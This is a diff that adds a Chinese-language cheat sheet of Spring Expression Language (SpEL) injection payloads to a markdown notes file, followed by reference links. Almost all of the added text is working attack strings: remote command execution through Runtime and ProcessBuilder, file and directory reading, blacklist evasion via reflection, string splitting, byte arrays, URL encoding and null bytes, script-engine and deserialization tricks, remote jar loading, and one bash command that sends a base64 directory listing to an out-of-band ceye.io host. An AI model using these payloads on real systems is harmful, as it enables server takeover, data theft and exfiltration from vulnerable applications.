@@ -143,7 +143,107 @@ public void velocity(String template) {
     Velocity.evaluate(context, swOut, "test", template);
 }
 ```
-http://rui0.cn/archives/1043
-https://guokeya.github.io/post/413GsNWtr/
-https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html
-https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/
+# SPEL Payload
+## 常见payload
+```java
+${12*12}
+T(Thread).sleep(10000)
+T(java.lang.Runtime).getRuntime().exec("calc.exe")
+// 同上，需要有上下文环境，EvaluationContext context = new StandardEvaluationContext("test");
+#this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")
+new java.lang.ProcessBuilder({'calc'}).start()
+//列目录
+#{T(java.util.Arrays).toString(T(java.nio.file.Files).list(T(java.nio.file.Paths).get('c:\\')).toArray())}
+//读文件
+new java.util.Scanner(new java.io.File('D:/logs/test.txt')).next()
+#{T(org.apache.commons.io.FileUtils).readFileToString(new java.io.File("c:\\1.txt"))}
+#{NEW java.util.Scanner(NEW java.io.BufferedReader(NEW java.io.FileReader(NEW java.io.File('/flag')))).nextLine()}
+#{New java.io.BufferedReader(New java.io.FileReader("/flag")).readLine()}
+#{T(java.nio.file.Files).lines(T(java.nio.file.Paths).get('c:\\1.txt')).findFirst().toString()}
+#{T(java.nio.file.Files).readAllLines(T(java.nio.file.Paths).get("D:/logs/test.txt"))}
+```
+## 反射调用
+```java
+// 反射调用+字符串拼接，关键字拆分
+T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',T(String[])).invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime')), new String[]{'cmd.exe','/c','calc'})
+// 同上，需要有上下文环境
+#this.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})
+// ProcessBuilder
+#{(T(String).getClass().forName("java.la"+"ng.ProcessBuilder").getConstructor('foo'.split('').getClass()).newInstance(new String[]{'calc.exe'})).start()}
+// exec
+T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('ex'+'ec',T(String[])).invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime').getMethod('getRu'+'ntime').invoke(T(String).getClass().forName('java.la'+'ng.Ru'+'ntime')), new String[]{'/bin/bash','-c','curl http://abcdef.ceye.io/`cd / && ls|base64|tr \"\n\" \"-\"`'})
+```
+## 关键字绕过
+```java
+//byte数组内容生成
+new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()
+T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))
+```
+用于String类动态生成字符的字符ASCII码转换生成:
+```python
+message = input('Enter message to encode:')
+print('Decoded string (in ASCII):\n')
+print('T(java.lang.Character).toString(%s)' % ord(message[0]), end="")
+for ch in message[1:]:
+   print('.concat(T(java.lang.Character).toString(%s))' % ord(ch), end=""), 
+print('\n')
+
+print('new java.lang.String(new byte[]{', end=""),
+print(ord(message[0]), end="")
+for ch in message[1:]:
+   print(',%s' % ord(ch), end=""), 
+print(')}')
+```
+## JavaScript引擎通用PoC
+```java
+T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("xxx"),)
+//JavaScript引擎+反射调用
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})),)
+//JavaScript引擎+URL编码
+T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29")),)
+```
+## 黑名单过滤".getClass("，未测试成功
+```java
+''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),new String[]{'cmd','/c','calc'})
+''.class.forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''.class.forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),new String[]{'cmd','/c','calc'})
+```
+## JDK9新增的shell
+```java
+T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
+```
+## 利用反序列化
+```java
+#{T(org.springframework.util.SerializationUtils).deserialize(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('rO0AB........'))}
+//通spring内置的一个方法。 输入类名，字节码，classload就可以new一个类。当类中有static方法的时候。new类就会自动触发
+T(org.springframework.cglib.core.ReflectUtils).defineClass('Singleton',T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('yv66vgAAADIAtQ....'),T(org.springframework.util.ClassUtils).getDefaultClassLoader())
+```
+## 利用request传值。绕过黑名单
+```java
+[[${#this.getClass().getClassLoader().loadClass(#request.getHeader(111)).getDeclaredMethod(#request.getHeader(222),
+#this.getClass().getClassLoader().loadClass(#request.getHeader(333))).invoke(#this.getClass().getClassLoader().loadClass(#request.getHeader(111)).getDeclaredMethod(#request.getHeader(444)).invoke(null),
+#request.getParameter(1))}]]
+```
+## URLClassloader
+```java
+New java.net.URLClassLoader(New java.net.URL[]{New java.net.URL("http://xxxx/xxx.jar"}).getDeclaredMethod("exec").invoke(null)
+```
+## 回显
+```java
+// 其次如果有输出点需要回显可以使用
+T(org.apache.commons.io.IOUtils).toString(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).....).getInputStream())
+T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(%27cmd%20/c%20dir%27).getInputStream())
+```
+## 其他绕过方式（如：%00等骚姿势绕过）
+```java
+T\x00(java.net.URLClassLoader).getSystemClassLoader().loadClass("java.nio.file.Files").readAllLines(T\x00(java.net.URLClassLoader).getSystemClassLoader().loadClass("java.nio.file.Paths").get("d:/logs/test.txtg"))
+''.class.forName('java.nio.file.Files').getDeclaredMethods()[17].invoke(null,''.class.forName('java.nio.file.Paths').getDeclaredMethods()[0].invoke(null,'d:/logs/test.txt',''.class.forName('jav'+'a.lang.'+'Str'+'ing').getDeclaredMethods()[63].invoke('','a')))
+T\x00(java.nio.file.Files).readAllLines(T\x00(java.nio.file.Paths).get('d:/logs/test.txt'),T\x00(java.nio.charset.Charset).defaultCharset())
+T%00(java.nio.file.Files).readAllLines(T%00(java.nio.file.Paths).get(%27d:/logs/test.txt%27),T%00(java.nio.charset.Charset).defaultCharset())
+```
+# 参考
+http://rui0.cn/archives/1043<br>
+https://guokeya.github.io/post/413GsNWtr/<br>
+https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html<br>
+https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/<br>
+https://aluvion.github.io/2019/04/25/Java%E7%89%B9%E8%89%B2-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/
